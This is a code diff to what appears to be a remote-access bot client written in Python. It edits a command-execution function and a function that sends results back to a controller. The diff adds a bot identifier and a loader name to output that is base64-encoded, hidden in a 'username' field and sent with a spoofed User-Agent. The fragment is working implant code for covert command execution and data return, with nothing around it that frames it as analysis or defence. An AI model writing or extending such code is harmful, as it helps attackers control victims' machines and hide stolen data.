@@ -88,7 +88,7 @@ def run_command(command, cleanup=True, kill_on_timeout=True):
     if len(command) > 3 and command[0:3] == "cd ":
         try:
             os.chdir(os.path.expanduser(command[3:]))
-            return "Directory changed."
+            return "Directory changed to: " + os.getcwd()
         except Exception as ex:
             log.error(str(ex))
             return str(ex)
@@ -191,7 +191,9 @@ def send_response(response, module_name="", response_options=""):
     """
     headers = {"User-Agent": USER_AGENT}
     data = urlencode({"username": b64encode(json.dumps(
-        {"response": b64encode(response), "module_name": module_name, "response_options": response_options}
+        {"response": b64encode(response),
+         "bot_uid": get_uid(), "loader_name": LOADER_OPTIONS["loader_name"],
+         "module_name": module_name, "response_options": response_options}
     ))})
 
     try:
